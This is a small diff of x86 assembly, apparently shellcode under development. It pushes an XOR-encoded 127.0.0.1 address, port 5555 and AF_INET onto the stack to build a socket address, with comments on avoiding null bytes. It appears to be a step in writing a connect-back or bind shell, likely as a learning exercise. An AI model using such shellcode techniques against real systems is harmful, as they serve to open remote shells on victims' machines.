@@ -20,9 +20,13 @@ main:
 	; push 0x0100007f ; Push IP to stack in reverse byte order ; need to revist the null bytes here  (127.0.0.1)
 	; We have a issue here in that the ip address 127.0.0.1 = 0x0100007f in hex which contains null bytes 
 	; Easiest way around this is to XOR the value with 0xffffffff
-	mov edi, 0xfeffff80 ; xor of 0x0100007f and 0xffffffff
-	xor edi, 0xffffffff
-	push edi
+	;mov edi, 0xfeffff80 ; xor of 0x0100007f and 0xffffffff
+	;xor edi, 0xffffffff
+	;push edi
+	mov eax,0xfeffff80
+	mov ebx,0xffffffff
+	xor ebx,eax
+	push ebx
 	push word 0xb315 ; Push 5555 to the stack in reverse byte order 5555 in hex = 0x15b3 
 	push word 0x2 ; push 2  to the stack (AF-INET) 
 
